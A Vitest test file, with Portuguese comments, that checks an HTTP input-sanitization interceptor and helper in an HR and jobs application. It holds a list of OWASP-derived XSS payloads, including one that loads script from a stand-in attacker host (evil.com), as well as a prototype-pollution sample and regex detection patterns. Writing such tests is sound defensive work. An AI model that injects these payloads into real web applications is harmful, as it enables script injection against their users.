import { describe, expect, it } from 'vitest';
import { of } from 'rxjs';
import { SanitizeInputInterceptor, sanitizeDeep } from './sanitize-input.interceptor';
import { sanitizeString } from '../utils/sanitize-string';

// Vetores do OWASP XSS Filter Evasion Cheat Sheet e de variações com entidades/ofuscação.
const XSS_VECTORS: string[] = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.com/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  "<IMG SRC=javascript:alert('XSS')>",
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:alert(1)">click</a>',
  '<a href="  jav&#x09;ascript:alert(1)">x</a>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '&lt;img src=x onerror=alert(1)&gt;',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<input autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  "<style>@import 'javascript:alert(1)';</style>",
  '<object data="data:text/html,<script>alert(1)</script>">',
  '<embed src="javascript:alert(1)">',
  '<!--<img src="--><img src=x onerror=alert(1)//">',
  '<IMG SRC=jAvAsCrIpT:alert(1)>',
  '<video><source onerror=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<form><button formaction=javascript:alert(1)>X</button></form>',
  'javascript:alert(document.cookie)',
  'vbscript:msgbox(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  '<img src=x onerror=&#97;lert(1)>',
  '"><script>alert(1)</script>',
  '\u0000<scr\u0000ipt>alert(1)</script>',
  '<<script>script>alert(1)<</script>/script>',
  '<script\n>alert(1)</script\n>',
  '<a href=&#106avascript:alert(1)>x</a>',
  '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;',
];

const ACTIVE = /<\s*[a-z!/?]/i;
const SCHEME = /(?:java|vb)\s*script\s*:|data\s*:\s*text\/html/i;
// eslint-disable-next-line no-control-regex
const CONTROL = /[\u0000-\u0008\u000B\u000C\u000E-\u001F]/;

function expectInert(output: unknown) {
  expect(typeof output).toBe('string');
  expect(output as string).not.toMatch(ACTIVE);
  expect(output as string).not.toMatch(SCHEME);
  expect(output as string).not.toMatch(CONTROL);
  expect(output as string).not.toMatch(/<\s*script/i);
}

function run(req: Record<string, any>) {
  const interceptor = new SanitizeInputInterceptor();
  const ctx: any = { getType: () => 'http', switchToHttp: () => ({ getRequest: () => req }) };
  interceptor.intercept(ctx, { handle: () => of(null) });
  return req;
}

describe('sanitizeString — vetores XSS', () => {
  it.each(XSS_VECTORS)('neutraliza %j', (vector) => {
    expectInert(sanitizeString(vector));
  });

  it('preserva texto legítimo com <, >, &, acentos e emoji', () => {
    for (const text of ['a < b', '5 > 3 and 2 < 4', 'R&D', 'Tom &amp; Jerry', 'João Çedilha — ação 🚀', 'x<3', 'Preço: R$ 1.200,50 (10% off)']) {
      expect(sanitizeString(text)).toBe(text);
    }
  });

  it('remove conteúdo de script (não deixa só as tags de fora)', () => {
    expect(sanitizeString('Maria<script>alert(1)</script> Silva')).toBe('Maria Silva');
  });

  it('trim por padrão, preserva espaços com trim:false e ignora não-string', () => {
    expect(sanitizeString('  oi  ')).toBe('oi');
    expect(sanitizeString('  oi  ', { trim: false })).toBe('  oi  ');
    expect(sanitizeString(42)).toBe(42);
  });
});

describe('SanitizeInputInterceptor — campos de negócio', () => {
  const FIELDS: Array<[string, string, string]> = [
    ['/employees', 'name', 'funcionário'],
    ['/employees', 'observations', 'observações'],
    ['/support/tickets/1/messages', 'message', 'mensagem de suporte'],
    ['/jobs', 'title', 'vaga'],
    ['/jobs', 'description', 'descrição da vaga'],
    ['/public/jobs/apply', 'candidateName', 'candidato'],
  ];

  it.each(FIELDS)('%s → %s (%s) fica inerte para todos os vetores', (url, field) => {
    for (const vector of XSS_VECTORS) {
      const req = run({ url, headers: { 'content-type': 'application/json' }, body: { [field]: vector } });
      expectInert(req.body[field]);
    }
  });

  it('sanitiza objetos e arrays aninhados e a query string', () => {
    const req = run({
      url: '/candidates?search=x',
      headers: {},
      body: { experiences: [{ company: '<img src=x onerror=alert(1)>ACME', tags: ['ok', '<script>1</script>'] }] },
      query: { search: '<script>alert(1)</script>Ana' },
    });
    expect(req.body.experiences[0].company).toBe('ACME');
    expect(req.body.experiences[0].tags).toEqual(['ok', '']);
    expect(req.query.search).toBe('Ana');
  });

  it('não altera senhas, tokens, hashes e assinaturas', () => {
    const body = {
      password: ' <script>x</script> com espaço ',
      newPassword: 'a<b>c',
      refreshToken: 'a<b',
      passwordHash: '$2b$12$<abc>',
      signatureBase64: 'PHNjcmlwdD4=',
      photoBase64: 'data:image/png;base64,iVBORw0KGgo=',
    };
    const req = run({ url: '/auth/login', headers: {}, body: { ...body } });
    expect(req.body).toEqual(body);
  });

  it('não altera data URIs de imagem/PDF', () => {
    const uri = 'data:application/pdf;base64,JVBERi0xLjQ=';
    expect(sanitizeDeep({ anyField: uri })).toEqual({ anyField: uri });
  });

  it('payload de webhook (Asaas e Mercado Pago) passa INTACTO', () => {
    const payload = { event: 'PAYMENT_RECEIVED', payment: { id: 'pay_1', description: '<b>Fatura</b> #1', externalReference: 'inv:<x>' } };
    for (const url of ['/finance/webhook/asaas', '/finance/webhook/mercadopago?x=1', '/webhooks/stripe']) {
      const req = run({ url, headers: { 'content-type': 'application/json' }, body: JSON.parse(JSON.stringify(payload)) });
      expect(req.body).toEqual(payload);
    }
  });

  it('não toca multipart nem templates de documento', () => {
    const body = { note: '<b>x</b>' };
    expect(run({ url: '/employees/import', headers: { 'content-type': 'multipart/form-data; boundary=x' }, body: { ...body } }).body).toEqual(body);
    expect(run({ url: '/document-templates', headers: {}, body: { body: '<p>{{nome}}</p>' } }).body).toEqual({ body: '<p>{{nome}}</p>' });
  });

  it('preserva campos de HTML intencional por nome (contentHtml)', () => {
    const html = '<h1>Contrato</h1><p>Cláusula 1</p>';
    expect(sanitizeDeep({ contentHtml: html, title: '<b>t</b>' })).toEqual({ contentHtml: html, title: 't' });
  });

  it('remove chaves de prototype pollution e ignora não-objetos', () => {
    const polluted = JSON.parse('{"__proto__":{"admin":true},"name":"ok"}');
    const out = sanitizeDeep(polluted) as Record<string, unknown>;
    expect(Object.keys(out)).toEqual(['name']);
    expect(({} as any).admin).toBeUndefined();
    const buf = Buffer.from('<script>');
    expect(sanitizeDeep(buf)).toBe(buf);
    expect(sanitizeDeep(null)).toBeNull();
    expect(sanitizeDeep(7)).toBe(7);
  });

  it('ignora contextos não-http (websocket/rpc)', () => {
    const interceptor = new SanitizeInputInterceptor();
    let called = false;
    interceptor.intercept({ getType: () => 'ws' } as any, { handle: () => { called = true; return of(null); } });
    expect(called).toBe(true);
  });
});
